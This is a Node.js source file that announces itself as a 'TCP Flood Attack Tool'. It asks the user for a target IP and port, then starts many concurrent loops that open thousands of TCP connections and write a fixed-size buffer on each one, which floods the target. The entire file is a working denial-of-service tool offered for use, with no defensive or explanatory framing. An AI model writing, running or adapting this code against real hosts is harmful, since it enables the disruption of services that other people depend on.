const net = require('net');
const readline = require('readline');

const defaultForce = 1250;
const defaultThreads = 100;

class Brutalize {
  constructor(ip, port, force, threads) {
    this.ip = ip;
    this.port = port;
    this.force = force;
    this.threads = threads;
  }

  async flood() {
    const maxPacketsPerThread = 10000; // Change this to your desired maximum
    const promises = [];
    for (let i = 0; i < this.threads; i++) {
      promises.push(this.send());
    }
    await Promise.all(promises);
  }

  async send() {
    const targetAddr = `${this.ip}:${this.port}`;
    for (let packetCount = 0; packetCount < 10000; packetCount++) {
      try {
        const client = new net.Socket();
        await new Promise((resolve, reject) => {
          client.connect(this.port, this.ip, () => {
            const data = Buffer.alloc(this.force);
            client.write(data);
            client.end();
            resolve();
          });
          client.on('error', (err) => reject(err));
        });
      } catch (err) {
        console.error('Error sending data:', err);
      }
    }
  }
}

async function main() {
  console.log("TCP Flood Attack Tool");

  const ip = await getInput("Enter the target IP -> ");
  const port = await getInput("Enter the target port -> ");

  const portInt = parseInt(port, 10);
  if (isNaN(portInt)) {
    console.log("Invalid port:", err);
    return;
  }

  const force = await getInput("Bytes per packet [press enter for 1250] -> ");
  const forceInt = force ? parseInt(force, 10) : defaultForce;
  if (isNaN(forceInt)) {
    console.log("Invalid force value:", err);
    return;
  }

  const threads = await getInput("Threads [press enter for 100] -> ");
  const threadsInt = threads ? parseInt(threads, 10) : defaultThreads;
  if (isNaN(threadsInt)) {
    console.log("Invalid threads value:", err);
    return;
  }

  const brutalize = new Brutalize(ip, portInt, forceInt, threadsInt);
  await brutalize.flood();

  console.log("Press Enter to stop the attack.");
  process.stdin.once('data', () => {
    process.exit(0);
  });
}

async function getInput(prompt) {
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
  });
  return new Promise((resolve, reject) => {
    rl.question(prompt, (input) => {
      rl.close();
      resolve(input.trim());
    });
  });
}

main().catch(err => console.error(err));
